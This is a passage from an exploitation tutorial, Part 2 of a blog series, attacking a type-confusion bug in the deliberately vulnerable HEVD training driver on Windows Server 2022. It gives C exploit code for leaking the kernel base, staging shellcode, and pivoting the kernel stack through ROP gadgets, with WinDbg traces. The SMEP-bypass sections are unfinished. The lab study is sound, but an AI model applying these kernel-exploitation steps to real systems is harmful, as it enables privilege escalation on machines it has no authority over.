[Home](https://plackyhacker.github.io) : [Part 1](https://plackyhacker.github.io/kernel/hevd) : [Part 3](https://plackyhacker.github.io/kernel/hevd-3)

# HEVD Type Confusion Walkthrough on Windows 2022 (Part 2)

## We Have Code Execution

At the end of part 1 we had code execution, we were able to pass a 16 byte buffer into the driver vio an IOCTL. If our target was [Windows 7](https://github.com/plackyhacker/HEVD/blob/main/hevd_type_confusion.cpp) we could simply write some shellcode, allocate some memory in user space, copy our shellcode to this memory, and trigger the type confuusion bug to execute our code. In modern Windows OSes, such as Server 2022, we can't do that.

## Supervisor Mode Execution Prevention

Supervisor Mode Execution Prevention (SMEP) is a security feature found in modern CPUs that prevents kernel-mode code from executing user-mode code. If the kernel jumps to or executes code located in user space, SMEP triggers a fault, preventing the action and mitigating potential exploitation avenues like privilege escalation attacks.

SMEP is enforced in x86 architecture using the `cr4` register; more specifically the 20th bit of the `cr4` register. We can examine this register when connected to a debugee in **WinDbg**:

```
cr4=0000000000370678
0: kd> .formats cr4
Evaluate expression:
...
  Binary:  00000000 00000000 00000000 00000000 00000000 00110111 00000110 01111000
...
```

If the 20th bit (remember that the index is `0`) is set to `1` then SMEP is enabled. If we attempt to execute code in user space from kernel mode we will get a BSOD with an `ATTEMPTED EXECUTE OF NOEXECUTE MEMORY` stop code:

<img width="758" alt="image" src="https://github.com/user-attachments/assets/e51217aa-684e-4bbe-b689-3dc5bd0c6be0">

In practice this means we need to execute code in kernel space; but we only have one shot. After our code has executed, the saved return address on the stack will return control to the driver. This seems pretty lousy but we can work with it.

## A Plan

Our plan is this:

- Allocate some memory in user mode to act as a fake stack.
- Find a ROP gadget that will pivot the kernel stack to our allocated memory (this will be triggered by the bug).
- On this fake stack we will write a ROP chain to either disable SMEP, or:
- Change the allocated memory so SMEP believes the memory allocated for our shellcode is owned by the kernel.
- Ret to our shellcode when SMEP is under the thumb.

We could build our entire shellcode as a ROP chain on the fake stack, but in this series of posts I have chosen to play by SMEPs rules, and there's plenty of blogs showing how to disable SMEP.

## kASLR and DEP

We need to take into account **kASLR** and **DEP**. Kernel Address Space Layout Randomization (kASLR) is a security technique that does exactly what it says, it randomises the memory locations of code (and other memory mechanisms, such as the stack, and the heap) in the kernel. To defeat this we need to disclose the base address of the kernel module loaded in memory. Luckily we will do this from **medium integrity**, and we get this for free. If we were exploiting the driver from **low integirty**, such as from a browser compromise, we would need an additional vulnerability in the driver, or another driver, that discloses some kernel space memory.

Data Execution Prevention (DEP) is a security feature that prevents code from being executed in certain regions of memory, which are typically used for data storage. This isn't a big deal for us, we are using a ROP chain, and all of our gadgets will reside in executable memory, and we are assigning the user space memory for our shellcode. We will make this executable when we allocate it.

## Disclosing the Kernel Base Address

To get the base address of the kernel we can use a very common technique:

```c
QWORD GetKernelBase()
{
    LPVOID drivers[ARRAY_SIZE];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    return (QWORD)drivers[0];
}
```

The `EnumDeviceDrivers` Win32 API retrieves the load address for each device driver in the system. The good news for us is that the first address that is returned is the base address of the kernel. That was easy! Here is our code so far:

```c
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdint>

typedef uint64_t QWORD;

#define ARRAY_SIZE 1024

QWORD GetKernelBase()
{
    LPVOID drivers[ARRAY_SIZE];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    return (QWORD)drivers[0];
}

int main(int argc, char* argv[]) {
  // get the base of the kernel
  QWORD kernelBase = GetKernelBase();
  printf("[+] Kernel base: 0x%p\n", kernelBase);

  // let's not trigger the bug yet!
  return 0;

  // get a handle to the driver
  HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

  if (hDriver == INVALID_HANDLE_VALUE) {
    printf("[!] Unable to get a handle for the driver: %d\n", GetLastError());
    return 1;
  }

  char someData[] = {
      0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
      0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42
  };

  DeviceIoControl(hDriver, 0x222023, (LPVOID)&someData, sizeof(someData), NULL, 0, NULL, NULL);

  return 0;
}
```

When we run the exploit on our target we get:

```
HEVD.exe
[+] Kernel base: 0xFFFFF80010A00000
```

We can check that it is correct in **WinDbg**:

```
1: kd> lm m nt
Browse full module list
start             end                 module name
fffff800`10a00000 fffff800`11a47000   nt
```

Now we have the base address of the kernel we can search for code chunks or gadgets that we can chain together to acheive our goal.

## User Mode Code Execution

We can execute code using the bug in the driver but we only control the first `call` to some code. Let's see what happens when we jump to some user space shellcode.

First we will create a `struct` to represent the user mode data we will send to the driver:

```c
typedef struct _USER_TYPE_CONFUSION_OBJECT
{
    ULONG_PTR ObjectID;
    ULONG_PTR ObjectType;
} USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT;
```

Place this at the top of our exploit code and replace `someData` with this:

```c
USER_TYPE_CONFUSION_OBJECT userData = { 0 };
userData.ObjectID = (ULONG_PTR)0x4141414141414141;
userData.ObjectType = (ULONG_PTR)alloc;

DeviceIoControl(hDriver, 0x222023, (LPVOID)&userData, sizeof(userData), NULL, 0, NULL, NULL);
```

This sends an address that we have allocated to the driver to be executed. Let's allocate this shellcode now (do this at the start of the main function):

```c
char shellcode[] = {
  0xcc, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xcc
};

LPVOID alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

if (!alloc)
{
  printf("[!] Error using VirtualAlloc. Error code: %u\n", GetLastError());
  return 1;
}

printf("[+] Memory allocated: 0x%p\n", alloc);

// copy the shellcode in to the memory
RtlMoveMemory(alloc, shellcode, sizeof(shellcode));
printf("[+] Shellcode copied to: 0x%p\n", alloc);
```

If you have done any user mode process injection this probably looks familiar. We can compile the exploit, connect our Kernel debugger, and execute the exploit on the Debugee. Ensure you remove the `return` statement that circumvented the bug.

When we run the exploit **WinDbg** breaks:

```
*** Fatal System Error: 0x000000fc
                       (0x0000023F34240000,0x000000011BCCF867,0xFFFFF68FDF4BC580,0x0000000080000005)

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

For analysis of this file, run !analyze -v
nt!DbgBreakPointWithStatus:
fffff800`10e1edc0 cc              int     3
```

If we run `!analyze -v` to see what the bugcheck is:

```
0: kd> !analyze -v
...
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY (fc)
...
```

This is **SMEP** preventing Kernel mode from executing code in user space. We need to be a bit more creative to gain code execution.

## Registers and a ROP NOP

We can use [RP++](https://github.com/0vercl0k/rp) to gather useful ROP gadgets from `ntoskrnl.exe` (take a copy of this from the target `C:\Windows\System32\`:

```
rp-win.exe -r 5 -f .\ntoskrnl.exe --va 0x0 > gadgets.txt
```

I generally use [Notepad++](https://notepad-plus-plus.org) to search for useful gadgets. We can find a `ret` gadget (otherwise known as a **ROP NOP**) and place it in our exploit code (replacing the call to our user space shellcode):

```c
userData.ObjectType = (ULONG_PTR)kernelBase + 0x639131;
```

In **WinDbg** we can set a breakpoint on this address:

```
1: kd> bp nt+0x639131
```

We can also confirm that the ROP gadget is what we think it is:

```
1: kd> u nt+0x639131
nt!SymCryptCallbackRandom <PERF> (nt+0x639131):
fffff800`11039131 c3              ret
...
```

When we compile and run the exploit on the target **WinDbg** will break at this address, now we can examine the registers when the bug is triggered:

```
Breakpoint 0 hit
nt!SymCryptCallbackRandom <PERF> (nt+0x639131):
fffff800`11039131 c3              ret
1: kd> r
rax=0000000000000000 rbx=ffff82862c702190 rcx=5b5c3b6748cd0000
rdx=0000000000000001 rsi=000000000000004d rdi=0000000000000003
rip=fffff80011039131 rsp=fffff68fdf3a3718 rbp=ffff8286312fd9d0
 r8=0000000000000008  r9=000000000000004d r10=000000006b636148
r11=fffff68fdf3a3718 r12=0000000000000000 r13=0000000000000000
r14=ffff82862c702190 r15=0000000000000010
iopl=0         nv up ei ng nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040286
nt!SymCryptCallbackRandom <PERF> (nt+0x639131):
fffff800`11039131 c3              ret
```

Notice that `r11` is the same value as `rsp`. This will come in handy later when we need to restore the stack upon return to the driver code.

When starting to write an exploit I generally define two gadgets that I can use to debug:

```c
// ROP Gadgets
QWORD ROP_NOP = kernelBase + 0x639131;                          // ret ;
QWORD INT3 = kernelBase + 0x852b70;                             // int3; ret;
```

## Stack Pivoting

Because we can only execute one gadget we need to execute something that can allow is to execute a ROP chain in kernel mode, where the ROP gadgets are in kernel space. In order to do this we need to pivot the stack with our single gadget to a fake user space stack where we can put our ROP chain.

<img width="1059" alt="Screenshot 2024-08-26 at 16 35 32" src="https://github.com/user-attachments/assets/3605c86a-79ad-402e-8a84-cc7279bddf6f">

The first thing we need to do is locate a suitable `mov esp` gadget. For it to be suitable it should allign to 16 bytes (essentially end with `0`). We can search `ntsokrnl.exe` for this. When one is allocated we can allocate the user space memory, lock it in, and execute it:

```c
// stack pivoting gadgets/values
QWORD STACK_PIVOT_ADDR = 0xF6000000;
QWORD MOV_ESP = kernelBase + 0x28bdbb;          // mov esp, 0xF6000000; ret;

// prepare the new stack
QWORD stackAddr = STACK_PIVOT_ADDR - 0x1000;
LPVOID stack = VirtualAlloc((LPVOID)stackAddr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

printf("[+] User space stack, allocated address: 0x%p\n", stack);

if (stack == 0x0)
{
  printf("[!] Error using VirtualAlloc. Error code: %u\n %u\n", GetLastError());
  return 1;
}

printf("[+] VirtualLock, address: 0x%p\n", stack);
if (!VirtualLock((LPVOID)stack, 0x14000)) {
  printf("[!] Error using VirtualLock. Error code: %u\n %d\n", GetLastError());
  return 1;
}
```

We have located a `mov esp` gadget that will pivot the stack to `0xf6000000`. We allocate memory at this location `-0x1000` and we allocate `0x14000` bytes for the size of the stack. The Kernel will write to the space before and after our ROP chain (fake stack) so we need to ensure we allocate this.

We also use the `VirtualLock` Win32 API. This ensures that the virtual memory is committed to physical memory and will not generate a page fault. Generating a page fault will cause a BSOD, we do not want that.

If we run our exploit now it will BSOD, so let's put something on the ROP chain and debug it:

```c
int index = 0;

// test rop chain
QWORD* rop = (QWORD*)((QWORD)STACK_PIVOT_ADDR);

// trigger a break
*(rop + index++) = INT3;

// some rop nops to examine
for (int i = 0; i < 50; i++)
  *(rop + index++) = ROP_NOP;

// ...

// allocate the userObject
USER_TYPE_CONFUSION_OBJECT userObject = { 0 };
userObject.ObjectID = (ULONG_PTR)0x4141414141414141;            // junk
userObject.ObjectType = (ULONG_PTR)MOV_ESP;                     // the gadget to execute

// trigger the bug
DeviceIoControl(hDriver, 0x222023, (LPVOID)&userObject, sizeof(userObject), NULL, 0, NULL, NULL);
```

We can compile the code and run it on the target with **WinDbg** attached to the Kernel:

```
Break instruction exception - code 80000003 (first chance)
nt!ExpQuerySystemInformation$filt$41+0xa:
fffff800`11252b70 cc              int     3
```

We hit the breakpoint on our ROP chain. Let's take a look at the stack:

```
1: kd> dq rsp
00000000`f6000008  fffff800`11039131 fffff800`11039131
00000000`f6000018  fffff800`11039131 fffff800`11039131
00000000`f6000028  fffff800`11039131 fffff800`11039131
00000000`f6000038  fffff800`11039131 fffff800`11039131
00000000`f6000048  fffff800`11039131 fffff800`11039131
00000000`f6000058  fffff800`11039131 fffff800`11039131
00000000`f6000068  fffff800`11039131 fffff800`11039131
00000000`f6000078  fffff800`11039131 fffff800`11039131
```

This shows all of our **nop rops**. Also notice where `rsp` points to now:

```
1: kd> r rsp
rsp=00000000f6000008
```

This is pointing in our user space stack. In the next section we will look at what we can do to defeat SMEP in our ROP chain, and `ret` to shellcode in user space.

## Disabling SMEP

todo

## Modifying Page Table Entries

todo

## User Mode Code Execution Take 2

todo

[Home](https://plackyhacker.github.io) : [Part 1](https://plackyhacker.github.io/kernel/hevd) : [Part 3](https://plackyhacker.github.io/kernel/hevd-3)
